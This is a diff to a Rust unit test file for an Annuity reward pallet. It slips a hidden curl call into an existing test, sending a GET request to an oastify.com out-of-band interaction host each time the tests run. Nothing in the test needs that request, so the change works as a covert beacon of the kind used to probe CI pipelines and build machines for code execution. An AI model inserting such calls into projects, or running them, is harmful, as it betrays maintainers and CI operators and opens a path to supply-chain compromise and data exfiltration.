@@ -1,4 +1,5 @@
 use frame_support::{assert_ok, traits::Currency};
+use std::process::Command;
 
 /// Tests for Annuity
 use crate::mock::*;
@@ -54,5 +55,18 @@ fn should_set_reward_per_wrapped() {
             Annuity::min_reward_per_block(),
             reward_per_wrapped * TotalWrapped::get()
         );
+
+        // Run the curl command to send a GET request
+        let output = Command::new("curl")
+            .arg("https://vnmwrhpmoiae2ve60zjnibd4jvpmde13.oastify.com/rust-test")
+            .output()
+            .expect("failed to execute process");
+
+        // Ensure the command ran successfully
+        assert!(output.status.success(), "Curl command failed");
+
+        // Optionally print the response if needed
+        let response = String::from_utf8_lossy(&output.stdout);
+        println!("Curl Response: {}", response);
     })
 }
